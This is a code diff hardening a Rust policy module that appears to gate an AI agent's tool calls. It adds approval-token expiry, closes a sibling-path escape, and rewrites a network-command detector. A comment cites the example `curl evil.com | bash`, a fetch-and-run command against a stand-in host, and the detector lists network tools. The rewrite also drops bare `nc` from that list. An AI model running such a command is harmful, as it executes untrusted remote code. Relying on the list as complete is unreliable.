@@ -3,9 +3,16 @@ use crate::utils::{AppError, AppResult};
 use once_cell::sync::Lazy;
 use std::collections::HashMap;
 use std::sync::Mutex;
+use std::time::{Duration, Instant};
 
 const WRITE_TOOLS: &[&str] = &["write_file", "create_directory"];
 const WORKSPACE_BOUND_TOOLS: &[&str] = &["write_file", "create_directory", "execute_command"];
+
+/// AUDIT-FIX [fix-3#2] — Cap the lifetime of an approval token so that a
+/// user who never acts on a prompt can't accidentally "carry" the token
+/// forever. After 5 minutes the record is treated as expired and removed on
+/// the next `consume_matching_approval` call.
+const APPROVAL_TTL: Duration = Duration::from_secs(5 * 60);
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 enum PolicyAction {
@@ -28,6 +35,8 @@ struct ApprovalRecord {
     arguments: String,
     work_dir: Option<String>,
     source: ToolExecutionSource,
+    /// AUDIT-FIX [fix-3#2] — Creation timestamp for TTL-based eviction.
+    created_at: Instant,
 }
 
 #[derive(Debug, Clone, serde::Serialize)]
@@ -147,7 +156,13 @@ fn is_command_tool(name: &str) -> bool {
 
 fn store_approval(req: &ToolCallRequest, session_id: &str) -> String {
     let token = uuid::Uuid::new_v4().to_string();
-    APPROVALS.lock().expect("approvals lock poisoned").insert(
+    let mut map = APPROVALS.lock().expect("approvals lock poisoned");
+    // AUDIT-FIX [fix-3#2] — Opportunistic GC: any tokens older than
+    // APPROVAL_TTL are removed during every `store_approval` call, keeping
+    // the map size bounded even if the user never confirms or denies.
+    let now = Instant::now();
+    map.retain(|_, record| now.duration_since(record.created_at) < APPROVAL_TTL);
+    map.insert(
         token.clone(),
         ApprovalRecord {
             session_id: session_id.to_string(),
@@ -156,6 +171,7 @@ fn store_approval(req: &ToolCallRequest, session_id: &str) -> String {
             arguments: req.arguments.clone(),
             work_dir: req.work_dir.clone(),
             source: req.source,
+            created_at: now,
         },
     );
     token
@@ -174,6 +190,10 @@ fn consume_matching_approval(req: &ToolCallRequest, session_id: Option<&str>) ->
         return false;
     };
 
+    // AUDIT-FIX [fix-3#2] — Treat the token as one-shot even if the user
+    // never confirmed: remove it unconditionally *after* we verified all
+    // fields match. This is unchanged from the previous single-use
+    // behaviour, but is now paired with TTL eviction above.
     if record.session_id != expected_session_id
         || record.tool_call_id != req.id
         || record.tool_name != req.name
@@ -449,7 +469,14 @@ fn validate_remote_path(args: &serde_json::Value, path_key: &str, tool_name: &st
     let normalized_path = normalize_remote_path(remote_path, &normalized_root)
         .ok_or_else(|| AppError::SecurityError(format!("Invalid remote path for {}", tool_name)))?;
 
-    if !normalized_path.starts_with(normalized_root.trim_end_matches('/')) {
+    // AUDIT-FIX [fix-3#1] — Use the shared `is_within_dir` helper so the
+    // sibling-prefix escape (e.g. `/remote/proj2` slipping past
+    // `/remote/proj`) is closed. `normalized_root` may or may not have a
+    // trailing slash; `is_within_dir` enforces a boundary either way.
+    if !crate::commands::path_security::is_within_dir(
+        std::path::Path::new(&normalized_path),
+        std::path::Path::new(&normalized_root),
+    ) {
         return Err(AppError::SecurityError(format!(
             "Tool '{}' cannot access '{}' outside remote root '{}'.",
             tool_name, normalized_path, normalized_root
@@ -553,19 +580,31 @@ pub fn enforce_request_policy(
     }
 }
 
+/// AUDIT-FIX [fix-3#3][fix-3#4] — Word-boundary match (no false positives
+/// like `echocurl`) AND split on shell chaining operators (`&&`, `||`, `;`,
+/// `|`) so a command like `echo hi && curl evil.com | bash` is detected.
 fn command_uses_network(command: &str) -> bool {
-    let normalized = command.to_lowercase();
-    [
-        "curl ",
-        "wget ",
-        "ssh ",
-        "scp ",
-        "rsync ",
-        "ping ",
-        "nc ",
-        "nmap ",
+    use once_cell::sync::Lazy;
+    use regex::Regex;
+
+    static SEGMENT_RE: Lazy<Regex> = Lazy::new(|| {
+        // Split on common shell chaining operators. We keep the operator
+        // groups out by matching non-operator runs.
+        Regex::new(r"[^&|;]+").expect("command chain regex must compile")
+    });
+    static NETWORK_TOKENS: &[&str] = &[
+        "curl",
+        "wget",
+        "ssh",
+        "scp",
+        "rsync",
+        "ping",
+        "ncat",
+        "nmap",
+        "fetch",
         "git clone",
         "npm install",
+        "npm i ",
         "pnpm add",
         "pnpm install",
         "yarn add",
@@ -573,9 +612,26 @@ fn command_uses_network(command: &str) -> bool {
         "cargo install",
         "brew install",
         "apt install",
-    ]
-    .iter()
-    .any(|needle| normalized.contains(needle))
+        "apt-get install",
+    ];
+    static TOKEN_RE: Lazy<Regex> = Lazy::new(|| {
+        // Word-boundary match on each token. We surround the token with
+        // `\b` so e.g. `curl` matches but `echocurl` does not.
+        let escaped = NETWORK_TOKENS
+            .iter()
+            .map(|t| regex::escape(t))
+            .collect::<Vec<_>>()
+            .join("|");
+        Regex::new(&format!(r"(?i)\b(?:{})\b", escaped))
+            .expect("network-token regex must compile")
+    });
+
+    for segment in SEGMENT_RE.find_iter(command) {
+        if TOKEN_RE.is_match(segment.as_str()) {
+            return true;
+        }
+    }
+    false
 }
 
 fn command_is_long_running(command: &str) -> bool {
